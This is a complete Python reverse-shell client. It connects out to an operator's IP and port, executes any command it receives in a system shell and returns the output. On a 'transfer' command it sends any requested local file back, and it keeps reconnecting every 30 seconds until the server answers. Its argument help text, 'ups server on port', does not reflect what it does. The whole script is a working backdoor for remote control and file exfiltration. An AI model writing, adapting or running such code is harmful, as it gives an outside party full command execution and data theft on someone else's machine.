#!/usr/bin/env python3
import socket
import argparse
import subprocess
import os
import time
import sys

GREEN = '\033[92m'
WARNING = '\033[93m'
ERROR = '\033[91m'
ENDC = '\033[0m'
CLOSE_CONNECTION = "close"
TRANSFER = "transfer"
FILE_NOT_FOUND = "file not found789"
TRANSFER_COMPLETE = "transfer completed456"
TIMEOUT = 30
SEP = "*"
# codepage = sys.getdefaultencoding()

def args():
    parser = argparse.ArgumentParser("ups server on port")
    parser.add_argument("-p", "--port", default=8080, type=int, help="port of server")
    parser.add_argument("-ip", default='', help="ip, default is ''")
    parser.add_argument("-t", "--timeout", default=TIMEOUT, help="timeout to retry connect", type=int)
    return parser.parse_args()


def print_error(s, **kwargs):
    print(f"{ERROR}{s}{ENDC}", **kwargs)


def print_ok(s, **kwargs):
    print(f"{GREEN}{s}{ENDC}", **kwargs)


def print_warn(s, **kwargs):
    print(f"{WARNING}{s}{ENDC}", **kwargs)


def transfer_data(client: socket.socket, path):
    if os.path.exists(path):
        file = open(path, "rb")
        data = file.read(1024)
        while data:
            client.send(data)
            data = file.read(1024)
        client.send(TRANSFER_COMPLETE.encode())
        file.close()
    else:
        client.send(FILE_NOT_FOUND.encode())


def connect(ip, port):
    print_warn(f"trying to connect to {ip}:{port}")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    print_ok("connected, ready to work...")
    while True:
        command = client.recv(1024)
        # print(command)
        print_warn(f"\t\tgot command {command.decode()} ")
        if CLOSE_CONNECTION in command.decode():
            client.close()
            break
        elif TRANSFER in command.decode():
            grab, path = command.split(b"*")
            try:
                transfer_data(client, path.decode())
            except Exception as e:
                client.send(str(e).encode())
        else:
            p = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
            # p.wait()
            # out = p.stdout.read()
            # err = p.stdou
            # client.send(p.stdout.read())
            # client.send(p.stderr.read())
            out, err = p.communicate()
            print_warn(f"out: {out}, err:{err}")
            s = out.decode("cp1251") # string
            b = s.encode('utf-8')
            if out or err:
                client.send(out)
                client.send(err)
            else:
                client.send(b"OK")

 # UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 222: invalid start byte

if __name__ == "__main__":
    option = args()
    timeout = option.timeout
    while 1:
        try:
            connect(option.ip, option.port)
        except (ConnectionRefusedError, BrokenPipeError) as e:
            print_error(e)
            print_error(f"server is down, waiting for {timeout} sec")
            time.sleep(timeout)
